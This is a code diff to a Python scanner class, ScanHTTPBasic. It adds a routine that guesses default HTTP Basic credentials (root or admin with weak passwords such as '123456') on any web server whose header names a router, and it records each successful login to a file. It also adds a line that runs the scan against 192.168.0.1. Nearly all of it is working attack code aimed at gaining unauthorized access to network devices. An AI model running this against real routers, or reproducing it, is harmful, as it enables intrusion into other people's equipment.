@@ -34,6 +34,18 @@ class ScanHTTPBasic(object):
             except Exception:
                 continue
 
+    def try_authentication(self, target):
+        user = ['root', 'admin']
+        password = ['root', 'admin', '123456', '123']
+        for u in user:
+            for p in password:
+                response = requests.get('http://' + str(target), auth=HTTPBasicAuth(u, p))
+                if response.status_code == 200:
+                    f = open('target_accessed.txt', 'a+')
+                    f.write('IP: {} User: {} Password: {}\n'.format(target, u, p))
+                    f.close()
+                    break
+
     def search_web_server(self):
 
         for ip in IPv4Network(self.target_range[1]):
@@ -50,9 +62,14 @@ class ScanHTTPBasic(object):
                     f.write('IP: {} Server: {} \n'.format(ip, response.headers['Server']))
                     f.close()
 
+                elif str(response.headers['Server']).__contains__('Router'):
+                    self.try_authentication(ip)
+
             except requests.exceptions.ConnectionError:
                 continue
             except requests.exceptions.ReadTimeout:
                 continue
             except Exception:
                 continue
+c = ScanHTTPBasic((1,'192.168.0.1/32'))
+c.search_web_server()
